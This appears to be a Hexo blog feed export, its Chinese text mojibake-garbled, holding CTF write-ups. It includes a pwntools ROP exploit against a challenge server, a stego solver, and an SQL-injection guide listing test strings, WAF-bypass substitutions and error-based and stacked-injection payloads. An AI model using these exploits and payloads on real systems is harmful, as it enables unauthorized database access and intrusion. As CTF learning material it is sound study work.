æ–‡ä»¶ï¼ŒæŠ“åŒ…å¾—åˆ°<code>/admin/neditor/serve/uploadimage</code>è·¯ç”±ï¼Œç„¶ååœ¨<code>/admin/neditor/serve/catchImage</code>è·¯ç”±è¯»å–æ–‡ä»¶ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šRCEæ–‡ç« ï¼Œä¸å¤šé˜è¿°ã€‚<code>file_get_contents</code>ç›´æ¥ç”¨fileåè®®è¯»å–æ ¹ç›®å½•flagï¼Œåæ¥flagè¢«æ”¹åäº†ï¼Œè¿™é‡Œç®—æ˜¯å‰æœŸçš„åšæ³•äº†ã€‚</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>åé¢å³ä½¿æ‹¿åˆ°äº†shellä¹Ÿæ²¡æœ‰è¿›ä¸€æ­¥çªç ´ï¼Œæ‰«ipè¿˜æ‰«é”™äº†</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="æœªå®Œæˆçš„ç½‘ç«™"><a href="#æœªå®Œæˆçš„ç½‘ç«™" class="headerlink" title="æœªå®Œæˆçš„ç½‘ç«™"></a>æœªå®Œæˆçš„ç½‘ç«™</h3><p>çŒœæµ‹ç‚¹</p><p><code>./people/&#123;&#125;</code>å’Œ<code>./download?url=&#123;&#125;</code></p><p>è¯•äº†ä¸‹å‘ç°è¿‡æ»¤äº†<code>[]</code></p><p>ç„¶åç–¯ç‹‚è¢«åŸŸæ¸—é€æŠ˜ç£¨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>å³å¯</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"><a href="#ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§" class="headerlink" title="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"></a>ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>æ‰‹æ¯”è¾ƒå¿«</p><hr><h3 id="åšä¸ªé—®å·å§"><a href="#åšä¸ªé—®å·å§" class="headerlink" title="åšä¸ªé—®å·å§"></a>åšä¸ªé—®å·å§</h3><p>éå¸¸ç®€å•</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>å¬è¯´å›½èµ›æœ‰ä¸€ä¸ªrunning_pixel?</p><p>é‚£å°±ç±»æ¯”ä¸€ä¸‹ï¼Œå‘ç°å‡ å¼ å›¾ç‰‡ç±»ä¼¼ï¼Œçœ‹ä¸€ä¸‹md5ï¼Œå‘ç°ä¸€å…±åªæœ‰6ç§md5ã€‚çŒœæµ‹æ˜¯äºŒè¿›åˆ¶ï¼Œæå‡ºæ¥å‰16ç« ï¼ŒäºŒè¿›åˆ¶ä¸º</p><p><code>01000100</code>==<code>d</code></p><p><code>01101111</code>==<code>o</code></p><p>å¾ˆæ˜æ˜¾æ€è·¯æ­£ç¡®ï¼Œå†™è„šæœ¬å°±è¡Œäº†</p><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5æœˆ 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#åˆ›å»ºmd5å¯¹è±¡</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#æ›´æ–°md5å¯¹è±¡</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#è¿”å›md5å¯¹è±¡</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥åˆ†äº«</title>
      <link href="article/sqlinjection/"/>
      <url>article/sqlinjection/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><p>å°äº¤æµä¼šçš„æçº²ï¼Œè®°å½•ä¸‹ï¼Œæ²¡æœ‰é€»è¾‘å¯è¨€</p><p>ä»Šå¹´æœ¬äººå‚åŠ çš„CTFä¸­è®°å½•çš„sqlé¢˜ç›®ï¼Œç”±äºå¯èƒ½æœ‰å¤šç§è§£ï¼Œè¿™é‡Œåˆ—å‡ºæœ¬äººè§£æ³•ä»…ä¾›å‚è€ƒ</p><table><thead><tr><th>æ¯”èµ›-é¢˜ç›®åç§°</th><th>æ³¨å…¥ç±»å‹</th><th>è¯¦ç»†æƒ…å†µ</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹ï¼ŒåŒè¡¨æŸ¥è¯¢</td></tr><tr><td>å›½èµ›CISCN-easy_sql</td><td>ç›²æ³¨ï¼ŒæŠ¥é”™</td><td>sqlmapä¸€æŠŠæ¢­ï¼Œå¸ƒå°”å‹/å»¶æ—¶æ³¨å…¥/æŠ¥é”™æ³¨å…¥ï¼Œæœ€åæ— åˆ—åæ³¨å…¥</td></tr><tr><td>çº¢å¸½æ¯-WebsiteManger</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹(å¼‚æˆ–)/å»¶æ—¶æ³¨å…¥</td></tr><tr><td>çº¢æ˜è°·-happysql</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹(æ­£åˆ™)ï¼Œæ— åˆ—åæ³¨å…¥</td></tr><tr><td>DASCTFä¸‰æœˆèµ›-bestDB</td><td>è”åˆæ³¨å…¥</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>ç›²æ³¨</td><td>å»¶æ—¶æ³¨å…¥(ç¬›å¡å°”ç§¯)</td></tr><tr><td>HGAME-200OK!</td><td>è”åˆæ³¨å…¥</td><td>åŸºç¡€SQLæ³¨å…¥</td></tr><tr><td>HGAME-Liki-Jail</td><td>ç›²æ³¨</td><td>å»¶æ—¶æ³¨å…¥</td></tr><tr><td>æ˜¥ç§‹æ¯æ–°æ˜¥æ¬¢ä¹èµ›-æŒ‰Fæ³¨å…¥</td><td>è”åˆæ³¨å…¥</td><td>Pgsqlï¼Œå»¶æ—¶æ³¨å…¥(ä¹Ÿè®¸)/ä¿¡æ¯å¤–å¸¦/æ•°æ®åº“å¤–è”</td></tr></tbody></table><p>æ‰“ä¸ªå¹¿å‘Šï¼Œå„æ¯”èµ›çš„WPï¼Œæœ‰éœ€è¦çš„å¸ˆå‚…å¯ä»¥çœ‹çœ‹</p><p><a href="https://err0r.top/article/cqb2021/">æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021å…¬å¼€èµ›</a></p><p><a href="https://err0r.top/article/mardasctf/">SQLæ— åˆ—åæ³¨å…¥</a></p><p><a href="https://err0r.top/article/redhat2021/">çº¢å¸½æ¯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>ç»Ÿè®¡äº†ä¸€ä¸‹ä»Šå¹´çš„SQLæ³¨å…¥é¢˜ç›®ï¼Œå¯èƒ½ä¸å…¨ï¼Œä»ä¸Šè¡¨èƒ½çœ‹å‡ºå¤§éƒ¨åˆ†éƒ½æ˜¯ç›²æ³¨ï¼Œç›²æ³¨çš„é‡è¦æ€§å¯æƒ³è€ŒçŸ¥ã€‚</p><hr><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><ol><li>version()â€”â€”MySQLç‰ˆæœ¬</li><li>user()â€”â€”ç”¨æˆ·å</li><li>database()â€”â€”æ•°æ®åº“å</li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</li><li>@@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</li></ol><p>æœ€å¸¸ç”¨çš„ä¸€èˆ¬æ˜¯<code>database()</code>ï¼Œæœ‰æ—¶å€™æ³¨æ„çœ‹<code>user()</code>ï¼Œæœ‰äº›é¢˜ç›®ç»™çš„æ˜¯rootç”¨æˆ·ï¼Œéœ€è¦ç”¨<code>load_file()</code>è¯»æ–‡ä»¶ï¼Œä¸‹é¢å¼€å§‹æ³¨å…¥å‡†å¤‡</p><hr><h2 id="æµ‹è¯•æ³¨å…¥"><a href="#æµ‹è¯•æ³¨å…¥" class="headerlink" title="æµ‹è¯•æ³¨å…¥"></a>æµ‹è¯•æ³¨å…¥</h2><table><thead><tr><th>æµ‹è¯•å­—ç¬¦ä¸²</th><th>å˜  ç§</th><th>é¢„ æœŸ ç»“ æœ</th></tr></thead><tbody><tr><td>â€˜</td><td></td><td>è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯</td></tr><tr><td>1â€™ or â€˜1â€™=â€™1</td><td>1â€™) or (â€˜1â€™=â€™1</td><td>æ°¸çœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ</td></tr><tr><td>valueâ€™ or â€˜1â€™=â€™2</td><td>valueâ€™) or (â€˜1â€™=â€™2</td><td>ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ</td></tr><tr><td>1â€™ and â€˜1â€™=â€™2</td><td>1â€™) and (â€˜1â€™=â€™2</td><td>æ°¸å‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™+â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b</td><td>SQL Serverå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™ â€˜b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b</td><td>MySQLå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>Oracleå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr></tbody></table><hr><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>ç›²æ³¨ï¼Œå°±æ˜¯æŒ‡æ‰§è¡Œsqlè¯­å¥åè¿”å›å€¼ä¸ç›´æ¥å›æ˜¾åˆ°å‰ç«¯é¡µé¢</p><hr><h2 id="è¿‡æ»¤æƒ…å†µ"><a href="#è¿‡æ»¤æƒ…å†µ" class="headerlink" title="è¿‡æ»¤æƒ…å†µ"></a>è¿‡æ»¤æƒ…å†µ</h2><h3 id="è¿‡æ»¤select"><a href="#è¿‡æ»¤select" class="headerlink" title="è¿‡æ»¤select"></a>è¿‡æ»¤select</h3><p>æ¯”è¾ƒåŠ²çˆ†ï¼Œå¦‚æœæœ‰å›æ˜¾å¯ä»¥æŠ¥é”™æ³¨å…¥æŸ¥å‡ºç®€å•ä¿¡æ¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>/<code>database()</code>/<code>version()</code></p><ul><li>ä½†è¿™ä¸è¡Œï¼Œå¯ä»¥åˆ©ç”¨å †å æ³¨å…¥ç»•è¿‡è¿‡æ»¤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>ç„¶ååˆ©ç”¨é¢„ç¼–è¯‘æ–¹å¼æŸ¥æ•°æ®</p><p>ç»å…¸é¢˜ç›®ï¼š<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019å¼ºç½‘æ¯-éšä¾¿æ³¨</a></p><ul><li><p>æˆ–è€…<code>alter</code>æ”¹è¡¨åï¼Œç„¶åä¸‡èƒ½å¯†ç ç™»é™†å‡ºç»“æœ(å¦‚æœå¯å›æ˜¾çš„è¯)</p></li><li><p>æ®è¯´webç«¯è¿‡æ»¤ä¹Ÿè®¸å¯ä»¥preg_matchå›æº¯é™åˆ¶(æœ‰çš„æƒ…å†µ)</p></li><li><p>åŒè¡¨çš„è¯å¯ä»¥åŒè¡¨æŸ¥è¯¢</p><p>ç›²æ³¨å­—æ®µååˆ©ç”¨<code>left(column,0)</code></p><p>å½“å­˜åœ¨å­—æ®µæ—¶è¿”å›True</p></li></ul><p>åŸºæœ¬è¿‡æ»¤</p><table><thead><tr><th align="center">è¿‡æ»¤</th><th align="center">æ›¿ä»£æ–¹æ³•</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[ç©ºæ ¼]</td><td align="center">/**/æˆ–()æˆ–%0a</td></tr><tr><td align="center">#</td><td align="center">â€“+</td></tr><tr><td align="center">substr()</td><td align="center">mid()ã€substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()ã€bin()ã€ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;ã€&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>æµ‹è¯•å­—ç¬¦ä¸²</th><th>å˜  ç§</th><th>é¢„ æœŸ ç»“ æœ</th></tr></thead><tbody><tr><td>â€˜</td><td></td><td>è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯</td></tr><tr><td>1â€™ or â€˜1â€™=â€™1</td><td>1â€™) or (â€˜1â€™=â€™1</td><td>æ°¸çœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ</td></tr><tr><td>valueâ€™ or â€˜1â€™=â€™2</td><td>valueâ€™) or (â€˜1â€™=â€™2</td><td>ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ</td></tr><tr><td>1â€™ and â€˜1â€™=â€™2</td><td>1â€™) and (â€˜1â€™=â€™2</td><td>æ°¸å‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™+â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b</td><td>SQL Serverå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™ â€˜b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b</td><td>MySQLå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>Oracleå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr></tbody></table><h2 id="ç§»ä½æº¢æ³¨"><a href="#ç§»ä½æº¢æ³¨" class="headerlink" title="ç§»ä½æº¢æ³¨"></a>ç§»ä½æº¢æ³¨</h2><p>çŸ¥é“è¡¨åä¸éœ€è¦çŸ¥é“å­—æ®µåï¼Œä¸€èˆ¬æ²¡ç”¨ï¼Œèƒ½ç”¨çš„æ—¶å€™éƒ½èƒ½ç”¨å…¶ä»–çš„æ³¨å‡ºæ¥ã€‚</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021CISCN-WP</title>
      <link href="article/ciscn2021/"/>
      <url>article/ciscn2021/</url>
      
        <content type="html"><![CDATA[<p>Ciscn 2021</p><p>é˜Ÿä¼åç§°ï¼šS3C_2021</p><a id="more"></a><h2 id="é˜Ÿä¼æƒ…å†µ"><a href="#é˜Ÿä¼æƒ…å†µ" class="headerlink" title="é˜Ÿä¼æƒ…å†µ"></a>é˜Ÿä¼æƒ…å†µ</h2><p><del>æœ¬èœé¸¡å¤ªèœï¼Œä¸å€¼ä¸€æï¼Œå¸Œæœ›åˆ†åŒºèµ›èƒ½å†²åˆºï¼Œäº‰å–è¿›å…¥æ€»å†³èµ›(åˆ äº†)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sqlæ³¨å…¥ï¼Œsqlmapè·‘</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>æ ¹æ®logå¾—çŸ¥åº“åsecurity</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>è¡¨åusersï¼Œflag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payloadï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token 